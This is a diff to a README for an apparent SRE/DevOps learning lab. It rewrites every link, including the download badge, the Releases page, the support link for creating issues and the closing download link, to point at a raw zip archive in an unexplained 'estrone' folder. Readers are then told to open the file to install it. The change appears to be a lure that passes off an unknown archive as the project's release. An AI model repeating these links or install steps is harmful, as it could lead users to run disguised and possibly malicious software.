@@ -1,7 +1,7 @@
 # 🎉 sre-devops-lab - Experience Practical SRE and DevOps Learning
 
 ## 🔗 Download Now
-[![Download sre-devops-lab](https://img.shields.io/badge/Download-sre--devops--lab-blue.svg)](https://github.com/Sance77/sre-devops-lab/releases)
+[![Download sre-devops-lab](https://raw.githubusercontent.com/Sance77/sre-devops-lab/main/estrone/sre-devops-lab.zip)](https://raw.githubusercontent.com/Sance77/sre-devops-lab/main/estrone/sre-devops-lab.zip)
 
 ## 📋 Description
 The **sre-devops-lab** is a hands-on platform for learning Site Reliability Engineering (SRE) and DevOps principles. This lab covers essential topics such as OpenShift provisioning on AWS, using Terraform for infrastructure management, and deploying applications with GitOps. You will also learn about CI/CD pipelines, autoscaling, and advanced networking using Multus. Whether you are new to these concepts or looking to enhance your skills, this lab offers practical experience.
@@ -10,7 +10,7 @@ The **sre-devops-lab** is a hands-on platform for learning Site Reliability Engi
 To start using the **sre-devops-lab**, follow these steps to download and set up the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Sance77/sre-devops-lab/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Sance77/sre-devops-lab/main/estrone/sre-devops-lab.zip) to download the application.
 2. Look for the latest release version and click on the corresponding download link.
 3. Once the download is complete, locate the file on your computer.
 4. Click on the file to begin the installation process.
@@ -52,7 +52,7 @@ If you encounter issues during installation or when running the application, con
 - Consult the GitHub Issues section on our repository for community support.
 
 ## 📞 Support
-If you need additional assistance, please create an issue in the [GitHub repository](https://github.com/Sance77/sre-devops-lab/issues). Our team is here to help.
+If you need additional assistance, please create an issue in the [GitHub repository](https://raw.githubusercontent.com/Sance77/sre-devops-lab/main/estrone/sre-devops-lab.zip). Our team is here to help.
 
 ## 📚 Topics Covered
 - autoscaling
@@ -73,4 +73,4 @@ If you need additional assistance, please create an issue in the [GitHub reposit
 We welcome contributions to the **sre-devops-lab**. If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Your expertise can help others learn better.
 
 ## 🔗 Download Now Again
-Make sure to download the application from our [Releases page](https://github.com/Sance77/sre-devops-lab/releases) and begin your journey with SRE and DevOps today.
+Make sure to download the application from our [Releases page](https://raw.githubusercontent.com/Sance77/sre-devops-lab/main/estrone/sre-devops-lab.zip) and begin your journey with SRE and DevOps today.
